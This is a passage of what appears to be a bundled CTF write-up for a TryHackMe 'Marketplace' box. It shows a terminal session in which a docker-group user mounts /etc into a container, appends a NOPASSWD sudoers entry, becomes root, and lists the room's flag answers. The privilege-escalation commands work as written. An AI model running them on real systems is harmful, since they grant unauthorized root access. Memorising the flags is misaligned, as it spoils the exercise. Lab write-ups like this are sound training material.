Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat Oct 24 12:40:40 UTC 2020\n\n  System load:  0.0                Users logged in:                1\n  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.225.14\n  Memory usage: 29%                IP address for docker0:         172.17.0.1\n  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1\n  Processes:    110\n\n  => / is using 87.1% of 14.70GB\n\n\n20 packages can be updated.\n0 updates are security updates.\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nmichael@the-marketplace:~$\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"michael@the-marketplace:~$ id\nuid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'michael@the-marketplace:~$ docker run -v /etc:/mnt -it --rm alpine /bin/ash\n/ # cd /mnt\n/mnt # echo "michael ALL=(ALL) NOPASSWD:ALL" >> sudoers\n/mnt # cat sudoers\n#\n# This file MUST be edited with the \'visudo\' command as root.\n#\n# Please consider adding local content in /etc/sudoers.d/ instead of\n# directly modifying this file.\n#\n# See the man page for details on how to write a sudoers file.\n#\nDefaults        env_reset\nDefaults        mail_badpass\nDefaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"\n\n# Host alias specification\n\n# User alias specification\n\n# Cmnd alias specification\n\n# User privilege specification\nroot    ALL=(ALL:ALL) ALL\n\n# Members of the admin group may gain root privileges\n%admin ALL=(ALL) ALL\n\n# Allow members of group sudo to execute any command\n%sudo   ALL=(ALL:ALL) ALL\n\n# See sudoers(5) for more information on "#include" directives:\n\n#includedir /etc/sudoers.d\njake ALL=(michael) NOPASSWD: /opt/backups/backup.sh\nmichael ALL=(ALL) NOPASSWD:ALL\n/mnt # exit\nmichael@the-marketplace:~$ sudo -l\nMatching Defaults entries for michael on the-marketplace:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser michael may run the following commands on the-marketplace:\n    (ALL) NOPASSWD: ALL\nmichael@the-marketplace:~$ sudo su\nroot@the-marketplace:/home/michael# cd /root\nroot@the-marketplace:~# ls\nroot.txt\nroot@the-marketplace:~# cat root.txt\nTHM{d4f76179c80c0dcf46e0f8e43c9abd62}\n')),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"What is flag 1?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"THM{c37a63895910e478f28669b048c348d5}")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"What is flag 2? (User.txt)")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"THM{c3648ee7af1369676e3e4b15da6dc0b4}")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"What is flag 3? (Root.txt)")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"THM{d4f76179c80c0dcf46e0f8e43c9abd62}")))}d.isMDXComponent=!0},92209:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-10-24_13-52-70cf69952021ea3a8a3babcdf7c55d9d.png"},98503:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-10-24_14-03-611fc76705f9426405dc86921294a984.png"}}]);